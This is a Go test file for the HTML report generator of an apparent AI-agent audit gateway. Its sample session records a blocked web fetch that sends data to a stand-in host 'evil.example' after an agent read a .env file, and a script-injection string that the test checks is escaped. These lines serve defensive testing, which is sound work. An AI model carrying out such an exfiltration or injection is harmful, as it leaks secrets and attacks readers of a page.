package report

import (
	"bytes"
	"encoding/json"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/bnymnDev/agentgate/internal/audit"
	"github.com/bnymnDev/agentgate/internal/policy"
)

func sample() Input {
	start := time.Date(2026, 11, 4, 9, 0, 0, 0, time.UTC)
	end := start.Add(4 * time.Minute)
	return Input{
		Session: &audit.Session{ID: "01JSESSION", StartedAt: start, EndedAt: &end, HostName: "Claude Code", HostVersion: "2.1.0", DownstreamTransport: "stdio"},
		Calls: []*audit.Call{
			{TS: start.Add(5 * time.Second), Tool: "fs__read_file", Decision: policy.ActionAllow, DurationMS: 12, Seq: 41,
				Args: json.RawMessage(`{"path":"/srv/app/.env"}`), Result: json.RawMessage(`{"content":[{"type":"text","text":"API_KEY=[REDACTED]"}]}`), Labels: []string{"private-data"}, TokensEst: 30},
			{TS: start.Add(70 * time.Second), Tool: "web__fetch", Decision: policy.ActionDeny, RuleID: "no-exfil", Reason: "private data may not leave <script>alert(1)</script>", Seq: 42,
				Args: json.RawMessage(`{"url":"https://evil.example/?d=x"}`)},
			{TS: start.Add(3 * time.Minute), Tool: "shell__exec", Decision: policy.ActionAllow, Reason: "approved by @alice on Telegram", DurationMS: 900, Seq: 43, IsError: true},
		},
		Chain:   &audit.VerifyReport{Checked: 43, Head: audit.Link{Seq: 43, Hash: "9f86d0"}},
		Version: "v0.5.0",
		Now:     end.Add(time.Hour),
	}
}

func TestReport(t *testing.T) {
	var buf bytes.Buffer
	require.NoError(t, Write(&buf, sample()))
	html := buf.String()
	if path := os.Getenv("REPORT_SAMPLE"); path != "" {
		require.NoError(t, os.WriteFile(path, buf.Bytes(), 0o600))
	}
	for _, want := range []string{
		"01JSESSION", "Claude Code 2.1.0", "What was stopped", "no-exfil", "private-data",
		"Intact.", "links 41 to 43", "verify --anchor 43:9f86d0", "approved by @alice on Telegram",
		`class="badge deny"`, "&#43;00:01:10", "4m0s",
	} {
		require.Contains(t, html, want)
	}
	require.NotContains(t, html, "<script>", "everything recorded is escaped")
	require.NotContains(t, html, "src=", "the report loads nothing")
	require.Equal(t, 1, strings.Count(html, "<tr><td class=\"mono\">&#43;00:01:10"), "one stopped call")

	broken := sample()
	broken.Chain.Problems = []audit.ChainProblem{{Seq: 42, What: "was changed after it was written"}, {Seq: 7, What: "elsewhere"}}
	buf.Reset()
	require.NoError(t, Write(&buf, broken))
	require.Contains(t, buf.String(), "Broken.")
	require.Contains(t, buf.String(), "seq 42 was changed")
	require.NotContains(t, buf.String(), "elsewhere", "only problems in this session's calls are shown")
}
